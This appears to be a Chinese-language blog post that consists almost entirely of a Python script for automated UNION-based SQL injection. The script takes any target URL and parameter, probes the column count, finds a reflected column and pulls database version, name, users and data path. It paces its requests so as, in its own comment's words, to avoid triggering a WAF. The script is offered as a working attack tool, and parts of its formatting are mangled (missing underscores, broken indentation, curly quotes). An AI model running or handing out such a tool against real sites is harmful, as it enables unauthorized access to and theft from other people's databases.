sql自动化注入脚本union

Author: Apzx7 Date: 五月 4, 2025  21:58:58

import requests
import time
from urllib.parse import urljoin, quote

class UnionInjector:
def init(self, url):
self.url = url
self.headers = {
‘User-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36’
}
self.timeout = 10
self.delay = 1 # 请求间隔，避免触发WAF

def test_columns(self, param_name, max_columns=10):
    print("[*] 开始测试列数...")
    for i in range(1, max_columns + 1):
        # 构造NULL联合查询
        nulls = ','.join(['NULL'] * i)
        payload = f"' UNION SELECT {nulls}-- -"
        encoded_payload = quote(payload)
        
        try:
            response = self.send_request(param_name, encoded_payload)
            
            # 如果页面正常返回，可能找到正确的列数
            if response and response.status_code == 200:
                print(f"[+] 可能的列数: {i}")
                print(f"[+] 使用的Payload: {payload}")
                return i
                
            time.sleep(self.delay)  # 请求间隔
            
        except Exception as e:
            print(f"[-] 测试列数 {i} 时出错: {str(e)}")
            continue
    
    return None

def test_string_column(self, param_name, num_columns):
    print("\n[*] 开始测试字符串列...")
    test_str = 'TRAE'
    
    for i in range(1, num_columns + 1):
        # 构造测试字符串的查询
        columns = ['NULL'] * num_columns
        columns[i-1] = f"'{test_str}'"
        payload = f"' UNION SELECT {','.join(columns)}-- -"
        encoded_payload = quote(payload)
        
        try:
            response = self.send_request(param_name, encoded_payload)
            
            if response and response.status_code == 200:
                if test_str in response.text:
                    print(f"[+] 发现字符串列: {i}")
                    print(f"[+] 使用的Payload: {payload}")
                    return i
                    
            time.sleep(self.delay)
            
        except Exception as e:
            print(f"[-] 测试字符串列 {i} 时出错: {str(e)}")
            continue
    
    return None

def extract_data(self, param_name, num_columns, string_column):
    print("\n[*] 开始提取数据...")
    
    # 常用的数据库信息查询
    queries = [
        "version()",           # 数据库版本
        "database()",          # 当前数据库
        "user()",              # 当前用户
        "@@datadir",          # 数据库路径
        "system_user()",       # 系统用户
        "session_user()"      # 会话用户
    ]
    
    for query in queries:
        columns = ['NULL'] * num_columns
        columns[string_column-1] = query
        payload = f"' UNION SELECT {','.join(columns)}-- -"
        encoded_payload = quote(payload)
        
        try:
            response = self.send_request(param_name, encoded_payload)
            
            if response and response.status_code == 200:
                print(f"[+] {query}: {response.text}")
                
            time.sleep(self.delay)
            
        except Exception as e:
            print(f"[-] 提取 {query} 时出错: {str(e)}")
            continue

def send_request(self, param_name, payload):
    test_url = f"{self.url}?{param_name}={payload}"
    return requests.get(
        test_url,
        headers=self.headers,
        timeout=self.timeout
    )

def main():
print(“UNION联合注入测试工具”)
print(“=” * 50)

while True:
    url = input("\n请输入目标URL (输入q退出): ")
    if url.lower() == 'q':
        break
        
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        
    param_name = input("请输入参数名: ")
    
    injector = UnionInjector(url)
    
    # 1. 测试列数
    num_columns = injector.test_columns(param_name)
    if not num_columns:
        print("[-] 未能确定列数")
        continue
        
    # 2. 测试字符串列
    string_column = injector.test_string_column(param_name, num_columns)
    if not string_column:
        print("[-] 未能找到字符串列")
        continue
        
    # 3. 提取数据
    injector.extract_data(param_name, num_columns, string_column)

if name == “main“:
main()
